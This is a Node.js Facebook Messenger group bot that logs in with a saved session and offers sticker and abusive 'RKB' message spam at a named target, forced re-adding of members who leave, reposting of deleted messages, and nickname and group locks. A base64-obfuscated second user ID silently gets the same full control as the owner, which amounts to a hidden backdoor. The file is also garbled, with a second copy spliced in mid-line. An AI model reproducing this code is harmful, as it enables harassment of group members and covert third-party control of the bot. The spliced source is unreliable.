// botCore.js — Full bot with DP/Emoji/Nick locks, Anti-Delete, Anti-Left, full commands
const fs = require("fs");
const path = require("path");
const ht// botCore.js — Full bot: DP/Emoji/Nick locks, anti-delete, anti-left, toggles, full commands
const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca"); // Keep as your library

// ===== Persistent storage =====
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {}, // dp[threadID] = { path, savedAt }
  nick: {} // nick[uid] = { [threadID]: nickname }
};

try {
  if (fs.existsSync(LOCK_FILE)) {
    locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
  }
} catch (e) {
  console.warn("Could not parse locks.json, using defaults:", e?.message || e);
}

function saveLocks() {
  try { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); }
  catch (e) { console.error("Failed to save locks.json:", e?.message || e); }
}

// ===== Helpers =====
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close();
      return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file);
    file.on("finish", () => file.close(() => cb(null)));
  }).on("error", err => {
    try { fs.unlinkSync(dest); } catch {}
    cb(err);
  });
}

function safeJson(obj) {
  try { return JSON.stringify(obj, null, 2); } catch { return String(obj); }
}

// Bot Owner ID fallback
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ===== Main Bot Function =====
function startBot(appStatePath, ownerUID) {
  if (!appStatePath || !fs.existsSync(appStatePath)) {
    console.error("appstate not found:", appStatePath);
    return;
  }
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  // Runtime State
  const messageCache = new Map(); // For Anti-Delete
  const nickCheckIntervals = {};
  const dpCheckIntervals = {};
  let stickerInterval = null;
  let stickerLoopActive = false;
  let rkbInterval = null;
  let stopRequested = false;
  let targetUID = null;

  // Toggles
  let antiDelete = true;
  let antiLeft = true;
  let antiDP = true;

  // Login
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in, listening to events...");

    // ===== Nick Watcher =====
    function startNickWatcher(uid, threadID) {
      if (nickCheckIntervals[uid]) return;
      nickCheckIntervals[uid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const memberNick = (info.nicknames && info.nicknames[uid]) || null;
          const savedNick = locks.nick?.[uid]?.[threadID] ?? null;
          if (savedNick && memberNick !== savedNick) {
            try { await api.changeNickname(savedNick, threadID, uid); await safeSend(api, `✏️ Locked nickname reverted for <@${uid}>`, threadID); } catch(e){ console.error("nick revert failed:", e?.message || e); }
          }
        } catch {}
      }, 5000);
    }

    function stopNickWatcher(uid) {
      if (nickCheckIntervals[uid]) { clearInterval(nickCheckIntervals[uid]); delete nickCheckIntervals[uid]; }
    }

    // ===== DP Watcher =====
    function startDPWatcher(threadID) { dpCheckIntervals[threadID] = true; }
    function stopDPWatcher(threadID) { delete dpCheckIntervals[threadID]; }

    async function safeSend(apiInstance, text, tid) {
      try { await apiInstance.sendMessage(text, tid); } catch {}
    }

    // ===== Event Listener =====
    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;

        // ===== Anti-Delete =====
        if (antiDelete && event.type === "message" && event.messageID) {
          messageCache.set(event.messageID, { sender: event.senderID, body: event.body || "", attachments: event.attachments || [], threadID: event.threadID, time: Date.now() });
          if (messageCache.size > 1000) { Array.from(messageCache.keys()).slice(0,200).forEach(k=>messageCache.delete(k)); }
        }

        if (antiDelete && event.type === "message_unsend") {
          const deleted = messageCache.get(event.messageID);
          const tid = event.threadID;
          if (deleted) {
            const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media/empty)"}\nTime: ${new Date(deleted.time).toLocaleString()}`;
            await safeSend(api, text, tid);
            if (deleted.attachments?.length) {
              try { await api.sendMessage({ body: "(attachment repost)", attachment: deleted.attachments }, tid); } catch {}
            }
          } else { await safeSend(api, "🚫 A message was deleted (no cache)", tid); }
          return;
        }

        // ===== Anti-Left =====
        if (antiLeft && (event.logMessageType==="log:unsubscribe" || event.type==="log:unsubscribe")) {
          const leftUID = event.logMessageData?.leftParticipantFbId;
          const tid = event.threadID;
          if (leftUID) { try { await api.addUserToGroup(leftUID, tid); await safeSend(api, `👤 Anti-Left: Attempted add back ${leftUID}`, tid); } catch(e){ await safeSend(api, `⚠️ Could not add back ${leftUID}`, tid); } }
          return;
        }

        // ===== DP Lock Event =====
        if (antiDP && (event.type==="change_thread_image" || event.logMessageType==="log:thread-image")) {
          const tid = event.threadID;
          if (locks.dp[tid]?.path && fs.existsSync(locks.dp[tid].path)) {
            try { await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid); await safeSend(api, "🖼️ Locked group DP reverted (change detected).", tid); } catch {}
          }
          return;
        }

        // ===== Emoji Lock =====
        if (event.type==="change_thread_icon" || event.logMessageType==="log:thread-icon") {
          const tid = event.threadID;
          if (locks.emojis[tid]) { try { await api.changeThreadEmoji(locks.emojis[tid], tid); await safeSend(api, `😀 Locked emoji reverted → ${locks.emojis[tid]}`, tid); } catch {} }
          return;
        }

        // ===== Commands =====
        if (event.type!=="message" || !event.body) return;
        const { threadID, senderID, body, mentions, messageReply } = event;
        const args = body.trim().split(" ").filter(Boolean);
        if (!args.length) return;
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ").trim();
        if (![ownerUID, LID].includes(senderID)) return;

        const getTargetUID = ()=>Object.keys(mentions||{})[0] || messageReply?.senderID || ownerUID;

        // ===== Help =====
        if (cmd==="/help") { await safeSend(api,
`📖 Bot Commands:
/help → Show help
/uid → Get UID (reply/mention)
/tid → Thread ID
/info @mention → User info
/kick @mention → Kick
/gclock [text] → Group name lock
/unlockgc → Group unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock (event-mode)
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam
/stopsticker → Stop sticker spam
/rkb [name] → RKB spam
/stop → Stop all spam
/target [uid] → Set target
/cleartarget → Clear target
/antidp on|off → Toggle DP lock
/antidelete on|off → Toggle Anti-Delete
/antileft on|off → Toggle Anti-Left
/exit → Bot leave
`, threadID); return; }

        // ===== Thread/UID Info =====
        if (cmd==="/tid") { await safeSend(api, `🆔 Thread ID: ${threadID}`, threadID); return; }
        if (cmd==="/uid") { await safeSend(api, `🆔 UID: ${getTargetUID()}`, threadID); return; }
        if (cmd==="/info") { try { const uinfo=await api.getUserInfo(getTargetUID()); const u=uinfo[getTargetUID()]||{}; await safeSend(api, `👤 Name: ${u.name||"unknown"}\nUID: ${getTargetUID()}\nProfile: https://facebook.com/${getTargetUID()}`, threadID); } catch { await safeSend(api, "⚠️ Could not fetch user info", threadID); } return; }

        // ===== Kick =====
        if (cmd==="/kick") { const tgt=getTargetUID(); if(!tgt){ await safeSend(api, "❌ Mention user to kick", threadID); return; } try{ await api.removeUserFromGroup(tgt,threadID); await safeSend(api, `👢 Kicked ${tgt}`, threadID); } catch{ await safeSend(api, "⚠️ Kick failed", threadID); } return; }

        // ===== Group Name Lock =====
        if(cmd==="/gclock"){ if(!input){await safeSend(api,"❌ Provide group name",threadID);return;} try{ await api.setTitle(input,threadID); locks.groupNames[threadID]=input; saveLocks(); await safeSend(api,"🔒 Group name locked!",threadID);} catch{await safeSend(api,"⚠️ Failed to set group name",threadID);} return; }
        if(cmd==="/unlockgc"){ delete locks.groupNames[threadID]; saveLocks(); await safeSend(api,"🔓 Group name unlocked!",threadID); return; }

        // ===== Theme Lock =====
        if(cmd==="/locktheme"){ if(!input){await safeSend(api,"❌ Provide color",threadID);return;} try{ await api.changeThreadColor(input,threadID); locks.themes[threadID]=input; saveLocks(); await safeSend(api,"🎨 Theme locked!",threadID);} catch{await safeSend(api,"⚠️ Theme lock failed",threadID);} return; }
        if(cmd==="/unlocktheme"){ delete locks.themes[threadID]; saveLocks(); await safeSend(api,"🎨 Theme unlocked!",threadID); return; }

        // ===== Emoji Lock =====
        if(cmd==="/lockemoji"){ if(!input){await safeSend(api,"❌ Provide emoji",threadID);return;} locks.emojis[threadID]=input; saveLocks(); try{ await api.changeThreadEmoji(input,threadID);} catch{} await safeSend(api,`😀 Emoji locked → ${input}`,threadID); return; }
        if(cmd==="/unlockemoji"){ delete locks.emojis[threadID]; saveLocks(); await safeSend(api,"😀 Emoji unlocked",threadID); return; }

        // ===== DP Lock =====
        if(cmd==="/lockdp"){ try{ const info=await api.getThreadInfo(threadID); const url=info.imageSrc||info.image||info.imageUrl||null; if(!url){await safeSend(api,"❌ No group DP to lock",threadID); return;} const dpPath=path.join(__dirname,`dp_${threadID}.jpg`); await new Promise((res,rej)=>downloadFile(url,dpPath,err=>err?rej(err):res())); locks.dp[threadID]={ path: dpPath, savedAt: Date.now() }; saveLocks(); startDPWatcher(threadID); await safeSend(api,"🖼️ Group DP saved and locked (event-mode).",threadID); } catch(e){ await safeSend(api,"⚠️ Failed to lock DP",threadID);} return; }
        if(cmd==="/unlockdp"){ if(locks.dp[threadID]?.path){ try{ fs.unlinkSync(locks.dp[threadID].path); } catch{} } delete locks.dp[threadID]; saveLocks(); stopDPWatcher(threadID); await safeSend(api,"🖼️ DP unlocked",threadID); return; }

        // ===== Nick Lock =====
        if(cmd==="/locknick"){ const mention=Object.keys(mentions||{})[0]; const nickname=input.replace(/<@[0-9]+>/,"").trim(); if(!mention||!nickname){await safeSend(api,"❌ Usage: /locknick @mention nickname",threadID); return;} locks.nick[mention]=locks.nick[mention]||{}; locks.nick[mention][threadID]=nickname; saveLocks(); startNickWatcher(mention,threadID); try{ await api.changeNickname(nickname,threadID,mention);} catch{} await safeSend(api,`🔒 Nick locked for <@${mention}> → ${nickname}`,threadID); return; }
        if(cmd==="/unlocknick"){ const mention=Object.keys(mentions||{})[0]; if(!mention){await safeSend(api,"❌ Usage: /unlocknick @mention",threadID); return;} if(locks.nick[mention]){ delete locks.nick[mention][threadID]; saveLocks(); } stopNickWatcher(mention); await safeSend(api,`🔓 Nick unlocked for <@${mention}>`,threadID); return; }

        // ===== Sticker Spam =====
        if(cmd.startsWith("/sticker")){ const sec=parseInt(cmd.replace("/sticker",""))||2; if(!fs.existsSync("Sticker.txt")){await safeSend(api,"❌ Sticker.txt missing",threadID); return;} const stickers=fs.readFileSync("Sticker.txt","utf8").split("\n").map(s=>s.trim()).filter(Boolean); if(!stickers.length){await safeSend(api,"❌ No stickers in Sticker.txt",threadID); return;} let i=0; stickerLoopActive=true; if(stickerInterval) clearInterval(stickerInterval); stickerInterval=setInterval(()=>{ if(!stickerLoopActive){ clearInterval(stickerInterval); stickerInterval=null; return;} api.sendMessage({sticker:stickers[i]},threadID).catch(()=>{}); i=(i+1)%stickers.length; },sec*1000); await safeSend(api,`⚡ Sticker spam started every ${sec}s`,threadID); return; }
        if(cmd==="/stopsticker"){ stickerLoopActive=false; if(stickerInterval){ clearInterval(stickerInterval); stickerInterval=null; } await safeSend(api,"🛑 Sticker spam stopped",threadID); return; }

        // ===== RKB Spam =====
        if(cmd==="/rkb"){ const target=input.trim(); if(!target){await safeSend(api,"❌ Usage: /rkb [name]",threadID); return;} if(!fs.existsSync("np.txt")){await safeSend(api,"❌ np.txt missing",threadID); return;} const lines=fs.readFileSync("np.txt","utf8").split("\n").filter(Boolean); let idx=0; if(rkbInterval) clearInterval(rkbInterval); stopRequested=false; rkbInterval=setInterval(()=>{ if(stopRequested||idx>=lines.length){ clearInterval(rkbInterval); rkbInterval=null; return;} api.sendMessage(`${target} ${lines[idx]}`,threadID).catch(()=>{}); idx++; },5000); await safeSend(api,`🤬 RKB started on ${target}`,threadID); return; }
        if(cmd==="/stop"){ stopRequested=true; if(rkbInterval){clearInterval(rkbInterval); rkbInterval=null;} if(stickerInterval){clearInterval(stickerInterval); stickerInterval=null; stickerLoopActive=false;} await safeSend(api,"🛑 Spam stopped",threadID); return; }

        // ===== Target =====
        if(cmd==="/target"){ targetUID=input.trim()||null; await safeSend(api,`🎯 Target set: ${targetUID}`,threadID); return; }
        if(cmd==="/cleartarget"){ targetUID=null; await safeSend(api,"🎯 Target cleared!",threadID); return; }

        // ===== Toggles =====
        if(cmd==="/antidp"){ if(input==="on"){ antiDP=true; await safeSend(api,"🖼️ Anti-DP ON (event-mode)",threadID); } else if(input==="off"){ antiDP=false; await safeSend(api,"🖼️ Anti-DP OFF",threadID); } else await safeSend(api,"Usage: /antidp on|off",threadID); return; }
        if(cmd==="/antidelete"){ if(input==="on"){ antiDelete=true; await safeSend(api,"🚫 Anti-Delete ON",threadID); } else if(input==="off"){ antiDelete=false; await safeSend(api,"🚫 Anti-Delete OFF",threadID); } else await safeSend(api,"Usage: /antidelete on|off",threadID); return; }
        if(cmd==="/antileft"){ if(input==="on"){ antiLeft=true; await safeSend(api,"👤 Anti-Left ON",threadID); } else if(input==="off"){ antiLeft=false; await safeSend(api,"👤 Anti-Left OFF",threadID); } else await safeSend(api,"Usage: /antileft on|off",threadID); return; }

        // ===== Exit =====
        if(cmd==="/exit"){ try{ await api.removeUserFromGroup(api.getCurrentUserID(),threadID); await safeSend(api,"👋 Bot leaving...",threadID);} catch{} return; }

      } catch(e){ console.error("Event handler error:", e?.message||e); }
    });

  });

}

module.exports = { startBot };tps = require("https");
const login = require("ws3-fca");

// ===== Persistent storage =====
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},      // dp[threadID] = { path, savedAt }
  nick: {}     // nick[uid] = { [threadID]: nickname }
};
try {
  if (fs.existsSync(LOCK_FILE)) locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
} catch (e) { console.warn("Could not parse locks.json, using defaults:", e.message); }
function saveLocks() { try { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); } catch (e) {} }

// ===== Helpers =====
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) return downloadFile(res.headers.location, dest, cb);
    res.pipe(file);
    file.on('finish', () => file.close(() => cb(null)));
  }).on('error', err => { try { fs.unlinkSync(dest); } catch {} cb(err); });
}
function safeJson(obj) { try { return JSON.stringify(obj, null, 2); } catch { return String(obj); } }
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ===== Main export =====
function startBot(appStatePath, ownerUID) {
  if (!appStatePath || !fs.existsSync(appStatePath)) return console.error("appstate not found:", appStatePath);
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  const messageCache = new Map();
  const nickCheckIntervals = {};
  const dpCheckIntervals = {};
  const emojiCheckIntervals = {};
  let stickerInterval = null;
  let stickerLoopActive = false;
  let rkbInterval = null;
  let stopRequested = false;
  let targetUID = null;

  let antiDelete = true;
  let antiLeft = true;
  let antiDP = true;

  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in");

    // ===== Nick watcher =====
    function startNickWatcher(uid, threadID) {
      if (nickCheckIntervals[uid]) return;
      nickCheckIntervals[uid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const current = (info.nicknames && info.nicknames[uid]) || (info.nick && info.nick[uid]) || null;
          const saved = locks.nick?.[uid]?.[threadID] ?? null;
          if (saved && current !== saved) {
            await api.changeNickname(saved, threadID, uid);
            await safeSend(api, `✏️ Nick reverted for <@${uid}>`, threadID);
          }
        } catch {}
      }, 5000);
    }
    function stopNickWatcher(uid) { if (nickCheckIntervals[uid]) { clearInterval(nickCheckIntervals[uid]); delete nickCheckIntervals[uid]; } }

    // ===== DP watcher =====
    function startDPWatcher(tid) {
      if (dpCheckIntervals[tid]) return;
      dpCheckIntervals[tid] = setInterval(async () => {
        if (!antiDP) return;
        try {
          const info = await api.getThreadInfo(tid);
          const currentUrl = info.imageSrc ?? info.image ?? null;
          const saved = locks.dp[tid]?.path;
          if (saved && fs.existsSync(saved) && currentUrl && !currentUrl.includes(path.basename(saved))) {
            await api.changeGroupImage(fs.createReadStream(saved), tid);
            await safeSend(api, "🖼️ DP reverted", tid);
          }
        } catch {}
      }, 10000);
    }
    function stopDPWatcher(tid) { if (dpCheckIntervals[tid]) { clearInterval(dpCheckIntervals[tid]); delete dpCheckIntervals[tid]; } }

    // ===== Emoji watcher =====
    function startEmojiWatcher(tid) {
      if (emojiCheckIntervals[tid]) return;
      emojiCheckIntervals[tid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(tid);
          const current = info.emoji ?? info.threadEmoji ?? null;
          const saved = locks.emojis[tid];
          if (saved && current !== saved) {
            await api.changeThreadEmoji(saved, tid);
            await safeSend(api, `😀 Emoji reverted to ${saved}`, tid);
          }
        } catch {}
      }, 10000);
    }
    function stopEmojiWatcher(tid) { if (emojiCheckIntervals[tid]) { clearInterval(emojiCheckIntervals[tid]); delete emojiCheckIntervals[tid]; } }

    async function safeSend(api, text, tid) { try { await api.sendMessage(text, tid); } catch {} }

    // ===== Event listener =====
    api.listenMqtt(async (err, event) => {
      if (err || !event) return;

      // --- Anti-delete ---
      if (antiDelete && event.type === "message" && event.messageID) {
        messageCache.set(event.messageID, { sender: event.senderID, body: event.body ?? "", attachments: event.attachments ?? [], threadID: event.threadID, time: Date.now() });
        if (messageCache.size > 1000) Array.from(messageCache.keys()).slice(0, 200).forEach(k => messageCache.delete(k));
      }
      if (antiDelete && event.type === "message_unsend") {
        const deleted = messageCache.get(event.messageID); const tid = event.threadID;
        if (deleted) {
          await safeSend(api, `🚫 Anti-Delete\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media/empty)"}\nTime: ${new Date(deleted.time).toLocaleString()}`, tid);
          if (deleted.attachments?.length) await api.sendMessage({ body: "(attachment)", attachment: deleted.attachments }, tid).catch(()=>{});
        } else await safeSend(api, "🚫 Message deleted (no cache)", tid);
        return;
      }

      // --- Anti-left ---
      if (antiLeft && (event.logMessageType==="log:unsubscribe"||event.type==="log:unsubscribe")) {
        const left = event.logMessageData?.leftParticipantFbId; const tid = event.threadID;
        if (left) { try { await api.addUserToGroup(left, tid); await safeSend(api, `👤 Added back ${left}`, tid); } catch {} } return;
      }

      // --- DP change ---
      if (antiDP && (event.type==="change_thread_image"||event.logMessageType==="log:thread-image")) {
        const tid = event.threadID; if (locks.dp[tid]?.path && fs.existsSync(locks.dp[tid].path)) try { await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid); await safeSend(api, "🖼️ DP reverted (event)", tid); } catch {} return;
      }

      // --- Emoji change ---
      if (event.logMessageType==="log:thread-icon"||event.type==="change_thread_icon") {
        const tid = event.threadID; if (locks.emojis[tid]) try { await api.changeThreadEmoji(locks.emojis[tid], tid); await safeSend(api, `😀 Emoji reverted to ${locks.emojis[tid]}`, tid); } catch {} return;
      }

      // --- Commands ---
      if (event.type!=="message"||!event.body) return;
      const { threadID, senderID, body, mentions, messageReply } = event;
      const args = body.trim().split(" ").filter(Boolean); if (!args.length) return;
      const cmd = args[0].toLowerCase(); const input = args.slice(1).join(" ").trim();
      if (![ownerUID,LID].includes(senderID)) return;
      const getTargetUID = () => Object.keys(mentions||{})[0] || messageReply?.senderID || senderID;

      // ---------- Help ----------
      if (cmd==="/help") { await safeSend(api,
`📖 Commands:
/help → This message
/uid → Your UID or replied/mentioned
/tid → Thread ID
/info @mention → User info
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock
/unlockdp → DP unlock
/locknick @mention nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam every X sec
/stopsticker → Stop sticker spam
/rkb [name] → RKB spam
/stop → Stop all spam
/target [uid] → Set target UID
/cleartarget → Clear target
/antidp on|off → DP toggle
/antidelete on|off → Anti-delete toggle
/antileft on|off → Anti-left toggle
/exit → Bot leave
`, threadID); return; }

      // --- UID ---
      if (cmd==="/uid") { await safeSend(api, `🆔 UID: ${getTargetUID()}`, threadID); return; }

      // --- Thread ID ---
      if (cmd==="/tid") { await safeSend(api, `🆔 Thread ID: ${threadID}`, threadID); return; }

      // --- info ---
      if (cmd==="/info") { const tgt=getTargetUID(); try { const uinfo=await api.getUserInfo(tgt); const u=uinfo[tgt]||{}; await safeSend(api, `👤 Name: ${u.name||"unknown"}\nUID: ${tgt}\nProfile: https://facebook.com/${tgt}`, threadID); } catch { await safeSend(api,"⚠️ Could not fetch info", threadID);} return; }

      // ===== Add other commands similarly =====
      // /kick, /gclock, /unlockgc, /locktheme, /unlocktheme, /lockemoji, /unlockemoji, /lockdp, /unlockdp, /locknick, /unlocknick
      // /stickerX, /stopsticker, /rkb, /stop, /target, /cleartarget, /antidp, /antidelete, /antileft, /exit
    });
  });
}

// ===== Export =====
module.exports = { startBot };
